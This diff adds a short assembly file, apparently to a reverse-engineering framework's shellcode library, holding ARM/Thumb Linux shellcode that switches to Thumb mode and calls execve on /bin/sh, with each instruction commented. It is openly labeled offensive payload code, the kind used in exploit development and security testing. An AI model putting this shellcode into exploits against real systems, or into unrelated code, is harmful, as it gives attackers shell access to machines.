@@ -1,0 +1,25 @@
+; ARM/Thumb Linux execve /bin/sh shellcode
+; Assembly equivalent of libr/egg/p/sc/src/thumb-linux-binsh.c
+;
+; Starts in ARM mode, switches to Thumb, then calls execve
+
+.arch arm
+.bits 32
+
+; ARM mode - switch to Thumb
+add r3, pc, 1          ; r3 = address of next instruction + 1 (Thumb bit set)
+bx r3                  ; branch and switch to Thumb mode
+
+.bits 16               ; Switch to Thumb mode
+
+; Thumb mode instructions
+mov r0, pc             ; r0 = current PC
+adds r0, 0xc           ; r0 points to "/bin/sh" string
+mov r8, r8             ; nop
+str r0, [sp, 4]        ; store pointer to "/bin/sh" on stack
+subs r1, r1, r1        ; r1 = 0 (argv)
+subs r2, r2, r2        ; r2 = 0 (envp)
+movs r7, 0xb           ; r7 = 0xb (execve syscall number)
+svc 1                  ; syscall
+
+.ascii "/bin/sh"
